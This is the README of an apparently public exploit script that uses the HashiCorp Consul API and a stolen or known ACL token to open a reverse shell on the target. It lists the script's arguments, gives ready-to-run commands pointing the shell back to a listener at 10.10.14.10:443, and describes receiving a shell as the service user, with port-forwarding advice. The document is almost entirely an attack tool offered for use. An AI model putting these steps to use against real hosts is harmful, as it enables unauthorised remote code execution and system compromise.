## This exploit helps you to get a reverse shell, exploiting the Hashicorp-Consul service via API, not using tools like metasploit

· When executing the script with python3 with the --help parameter, it asks us for a series of parameters
    
    --rhost RHOST  remote host  (ip of the victim machine, if not specified, 127.0.0.1 will be used)
    --rport RPORT  remote port  (port where the consul API is executed, if not specified, 8500 will be used)
    --lhost LHOST  local host   (ip where the shell will be received)
    --lport LPORT  local port   (port where the shell will be received)
    --token TOKEN  acl token    (acl token needed to authenticate with the api)

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit1.png">


· If we have what is necessary, we can give it the arguments and run it, example:

    python3 exploit.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.10 --lport 443 --token bb03b43b-1d81-d62b-24b5-39540ee469b5


· or can be compacted with the other argument options

    python3 exploit.py -rh 127.0.0.1 -rp 8500 -lh 10.10.14.10 -lp 443 -tk bb03b43b-1d81-d62b-24b5-39540ee469b5
    

· When executing the script with its arguments we should see a message with a + which indicates that the request has been sent correctly

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit2.png">


· Checking your listener, in a couple of seconds you should get a shell as the user running the service

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit3.png">


· In case it detects that it cannot connect to the host, it will give a message, check the port is exposed and use port forwarding if necessary, then try again

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit4.png">
